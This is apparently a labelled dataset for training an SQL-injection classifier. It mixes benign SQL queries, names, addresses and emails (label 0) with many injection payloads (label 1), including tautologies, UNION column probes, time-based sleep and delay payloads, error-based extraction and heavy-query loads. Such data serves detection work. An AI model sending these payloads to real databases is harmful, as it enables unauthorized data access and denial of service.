payload	label
SELECT gone FROM simplest UNION ALL SELECT store FROM walk ORDER BY evening	0
-5694   )    )    as cxnb where 6858  =  6858 or 9323  =  9323#	1
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu"	1
34120	0
1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  7244  =  7244	1
4973	0
"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--"	1
vilcu-verschuer@eddydaniele.kz	0
SELECT * FROM soil FETCH FIRST 3 ROWS ONLY	0
SELECT COUNT ( men )  FROM certainly	0
8739	0
desnudez	0
INSERT INTO medicine  ( expression, sides, everything )  VALUES  ( 'wore', 'travel', 'rice' )  	0
caaveruelas	0
INSERT INTO what  ( who, score, separate )  VALUES  ( 'duty', 'dirty', 'turn' )  	0
1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '	1
SELECT TOP 3 * FROM creature SELECT * FROM except 3SELECT * FROM only	0
1' where 9216  =  9216	1
"1%"" rlike sleep  (  5  )  #"	1
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #"	1
SELECT AVG ( copper ) FROM image	0
1' union all select null,null,null,null,null,null,null,null--	1
8400069999999999	0
1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT Count ( * )  AS beyond	0
8380000000000001	0
SELECT TOP 3 * FROM closer WHERE rather = 'log'	0
SELECT * FROM per WHERE paid NOT LIKE 'ants%'	0
1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --	1
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv"	1
1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent  =  27990 AND  ( wp_posts.post_mime_type LIKE 'image/%' )  AND wp_posts.post_type  =  'attachment' AND   (  (  wp_posts.post_status  =  'inherit'  )  )   ORDER BY wp_posts.menu_order ASC LIMIT 0, 1	0
"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
chekhov@biosaludsystems.gov	0
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz"	1
SELECT COUNT ( DISTINCT golden )  FROM poetry	0
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#"	1
plza. felix rodriguez de la fuente 140 3a	0
"  SELECT   CAST ( ""2017-08-29"" AS DATE ) ;"	0
SELECT * FROM planned FETCH FIRST 50 PERCENT ROWS ONLY	0
-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#	1
1%'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '	1
-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq	1
SELECT * FROM affect WHERE dirt = 'camp'  OR yellow = 'salmon'	0
SELECT * FROM boat WHERE service = 'chart'  AND  ( yourself = 'rapidly' OR wide = 'shout' ) 	0
SELECT * FROM guide WHERE group = 'most' LIMIT 3	0
SELECT * FROM within WHERE famous  BETWEEN 10 AND 20	0
-9217 or 9323  =  9323#	1
SELECT AVG ( corner ) FROM whose SELECT SUM ( unusual ) 	0
1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #	1
SELECT * FROM claws  WHERE boy NOT LIKE '[thus]%'	0
8421939999999999	0
calvin@espaciodelpintor.by	0
SELECT slow FROM result UNION SELECT similar FROM function ORDER BY swing	0
noami	0
INSERT INTO arrow  ( instant, expression, lungs )  VALUES  ( 'thin', 'mixture', 'former' )  	0
  SELECT Orders.yourselfrID, Employees.hit, Employees.birthday FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dutyID ORDER BY Orders.cabinID	0
SELECT * FROM began	0
1 where 5859  =  5859 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
4344810000000000	0
SELECT COUNT ( gladID ) FROM pair	0
SELECT * FROM farm WHERE grass = 'material' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT * FROM lead WHERE grandmother = 'zipper'  OR brought = 'having'	0
-9772' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'igaa'  =  'igaa	1
-3497' order by 1#	1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""sxih""  =  ""sxih"	1
SELECT * FROM something WHERE characteristic BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT ProductName, UnitPrice *  ( UnitsInStock + NVL ( UnitsOnOrder, 0  )  )   FROM Products;	0
SELECT heard FROM single UNION ALL SELECT vapor FROM tail ORDER BY solution	0
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly	0
   SELECT cent, cool, bareFROM anybody WHERE drop  IS NOT NULL	0
1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --	1
-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop	1
shou-che	0
1'  )   as sagj where 4558  =  4558	1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""pawh""  =  ""pawh"	1
SELECT * FROM rays WHERE cap NOT LIKE '[instrument]%'	0
-5202 union all select 5332,5332,5332,5332,5332,5332,5332#	1
SELECT * FROM dry  WHERE attempt = function	0
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""%""  =  """	1
c/ venus 91, 1e	0
SELECT COUNT ( possible )  FROM once	0
shupe	0
"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf"	1
SELECT say ( s )  FROM pretty FULL OUTER JOIN	0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) 	1
9.18E+015	0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  '%'  =  '	1
SELECT COUNT ( helloID ) FROM wall	0
letra bala	0
"  SELECT LOCATE ( ""com"", ""W3Schools.com"", 3 )  AS MatchPosition;"	0
roccardi.betten@carrillo-de-albornoz.mil	0
SELECT * FROM understanding  WHERE no NOT LIKE '[captain]%'	0
select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '	1
-5365 or 7517  =  5726--	1
SELECT trace ( s )  FROM firm UNION	0
SELECT early ( s )  FROM population UNION ALL	0
"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"	1
SELECT * FROM compare WHERE Price NOT BETWEEN 10 AND 20	0
INSERT INTO angry  ( memory, built, riding )  VALUES  ( 'tried', 'seeing', 'finest' )  	0
4725	0
SELECT * FROM mice  WHERE problem = onto	0
  )   or   (  'a'  =  'a	1
"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """	1
-3458'  )   where 2053  =  2053 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
-9854  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  5696  =  5696	1
retiendas	0
rorke	0
SELECT * FROM essential FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM horse	0
" select * from users where id  =  1 or 1#""?  =  1 union select 1,version  (    )   -- 1"	1
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg	1
SELECT signal ( s )  FROM on LEFT JOIN	0
SELECT * FROM verb WHERE attention = 'train'	0
pasaje maria merida s/n, 4?h	0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""  =  """	1
SELECT TOP 3 * FROM whale	0
  SELECT * FROM directly WHERE hard NOT IN  ( 'lucky', 'bottom', 'earth' )  	0
74725623a	0
14602519a	0
-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj	1
INSERT INTO nobody ( trade, happen, amount, usual, interest, pony )  VALUES  ( 'supply', 'folks'. lonely', 'moving', 'contain', 'weight', 'opinion' )  	0
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""uvvy"" like ""uvvy"	1
torms, els	0
calle kresaltxu 94, 3?b	0
4790000000000000	0
SELECT * FROM porch WHERE Price NOT BETWEEN 10 AND 20	0
"1%""   )    )     )  "	1
c/ cervera 164, 1e	0
SELECT AVG ( either ) FROM usual SELECT SUM ( effect ) 	0
-5350   )    )    or 9323  =  9323#	1
1 and elt  (  4249  =  4249,7259  )  	1
admin' or '1'  =  '1	1
 select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1	1
guinee@misanimalesdomesticos.jp	0
SELECT roll FROM exclaimed UNION ALL SELECT rabbit FROM struggle ORDER BY office	0
"-6198""  )   or make_set  (  3602  =  2178,2178  )   and   (  ""xksq"" like ""xksq"	1
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #	1
rollie	0
SELECT fire ( s ) FROM stepped INNER JOIN	0
SELECT AVG ( wish ) FROM pile SELECT SUM ( duty ) 	0
5153	0
"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --	1
  SELECT * FROM above WHERE lips IN  ( 'adult', 'decide', 'our' )  	0
mangot barra	0
villalpando iturbide	0
1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd	1
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm"	1
 (  select chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7812  =  7812  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )   from dual  ) 	1
2.11181E+015	0
hoyo higueron 32 3-f	0
sempere	0
SELECT * FROM attention WHERE task  BETWEEN 10 AND 20	0
5718	0
SELECT COUNT ( frightenID ) FROM soap	0
-4413%'   )    )    union all select 1345,1345#	1
17403	0
ensminge	0
c/ paterna, s/n, 11h	0
 select * from users where id  =  '1' union select @ 1,version  (    )   --  1'	1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
SELECT * FROM bad WHERE baby BETWEEN row09/01/1996moving AND mood15/31/1996development	0
 UPDATE once SET stay = 'smell'WHERE worth = 'dirt'	0
falicov	0
SELECT * FROM account WHERE horn BETWEEN exciting09/01/1996frighten AND agree15/31/1996scientist	0
SELECT * FROM  ( SELECT alive FROM fruit ) 	0
SELECT COUNT ( excitement ) FROM drink	0
SELECT * FROM railroad WHERE city = 'pencil' FETCH FIRST 3 ROWS ONLY	0
ribamontn al mar	0
silo 179, 12?b	0
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY	0
1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  	1
1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  	1
trenaman_bourbault@sms24h.ar	0
SELECT * FROM bread WHERE bit = 'whom' LIMIT 3	0
1'+  (  select xzvf where 9727  =  9727	1
SELECT rose FROM muscle UNION SELECT tiny FROM our ORDER BY helpful	0
"-3609""   )    )    as fzyp where 9474  =  9474 or 9323  =  9323#"	1
SELECT AVG ( object )  FROM shot  SELECT SUM ( minerals ) 	0
" select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1"	1
marbella	0
SELECT MIN ( held )  AS gentle FROM fifty	0
-4915' union all select 1928,1928,1928,1928#	1
avenida espaa, 14, 1f	0
-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#	1
"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """	1
SELECT count ( s )  FROM center LEFT JOIN	0
SELECT * FROM whatever WHERE health NOT BETWEEN 'into' AND 'managed'	0
1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'jnmf'  =  'jnmf	1
SELECT * FROM hand WHERE fire BETWEEN motor09/01/1996yesterday AND policeman15/31/1996industrial	0
  SELECT himself,fresh FROM unhappy WHERE course = 'giving' UNION SELECT threw, few FROM thumb	0
agalladura	0
fermentadora	0
"1""   )    )    as ynuw where 9138  =  9138"	1
   SELECT nothing, like+ ', ' + represent+ ' ' + success+ ', ' + gray AS battle  FROM birth	0
"1""  )   union all select null,null,null,null,null#"	1
" select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1"	1
h46a00o	0
SELECT * FROM border 3	0
1'||  (  select 'ldad' where 6146  =  6146 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||'	1
DELETE FROM nose	0
"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"	1
"-9183""  )   as wctu where 2058  =  2058 or 3038  =  3038"	1
1 and make_set  (  9542  =  8888,8888  )  -- idkn	1
velichcanich pairot	0
admin'or 1  =  1 or ''  =  '	1
6246	0
SELECT * FROM final WHERE task BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM hunt WHERE ruler NOT LIKE 'thirty%'	0
ince2@flexinspect.cat	0
SELECT * FROM forward WHERE nation NOT BETWEEN 'tree' AND 'sudden'	0
tinti@21horas.hr	0
SELECT * FROM fell WHERE gulf = 'bee'	0
   SELECT Employees.count, COUNT ( Orders.stepID )  AS fiftyFROM    ( OrdersINNER JOIN reason ON Orders.panID  =  Employees.signalID ) 	0
SELECT fur FROM require UNION ALL SELECT gentle FROM weigh ORDER BY naturally	0
-7548 or 2850  =  9666	1
1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy	1
"1""   )    )    as iubt where 8179  =  8179 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
"1""   )    )    as chal where 6661  =  6661"	1
calle ramon mario mirazo 46	0
masmitj	0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol	1
SELECT progress ( s )  FROM important SELECT clay FROM tell	0
SELECT COUNT ( sunlight ) FROM talk	0
SELECT TOP 3 * FROM ran	0
huesca	0
SELECT * FROM happened WHERE rice = 'giant'	0
-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--	1
1'||  (  select 'bifa' where 6077  =  6077 and 4547  =  9301	1
nydia	0
SELECT * FROM struggle WHERE until IN  ( SELECT hot FROM happen ) 	0
laicismo	0
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pziy'  =  'pziy	1
SELECT * FROM yellow WHERE    NOT now = 'bend'	0
1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'	1
SELECT DISTINCT consonant FROM ago	0
SELECT MIN ( surprise )  AS support FROM work	0
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'ugoz'  =  'ugoz	1
SELECT * FROM exclaimed WHERE heading NOT BETWEEN 'muscle' AND 'continued'	0
SELECT MIN ( measure )  AS apple FROM dropped	0
ruesga	0
SELECT * FROM safety FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM powerful	0
1  )   as odqn where 3910  =  3910	1
yu-hung	0
SELECT * FROM straight  WHERE therefore = direction	0
1'||  (  select 'dpje' where 2704  =  2704 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
-6505'   )    )    as jtnp where 1037  =  1037 or elt  (  1032  =  1032,3623  )  --	1
-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) 	1
bebedizo	0
PRINT	1
waitfor delay '0:0:5' and   (  4614  =  4614	1
"1"" and elt  (  4249  =  4249,7259  )   and ""tmxx""  =  ""tmxx"	1
alcolea	0
 select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1	1
#NAME?	0
cecil.wolcott7@librodeapuntes.sv	0
SELECT find ( s ) FROM produce INNER JOIN	0
SELECT COUNT ( DISTINCT judge )  FROM month	0
SELECT DISTINCT belt FROM class	0
SELECT additional ( s )  FROM depend UNION	0
1'||  (  select 'xtcb' where 5240  =  5240	1
SELECT * FROM arrange WHERE function NOT LIKE '[accept]%'	0
SELECT doing ( s )  FROM general UNION ALL	0
1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
SELECT * FROM toy WHERE factor NOT LIKE '[mill]%'	0
1   )    )    union all select null#	1
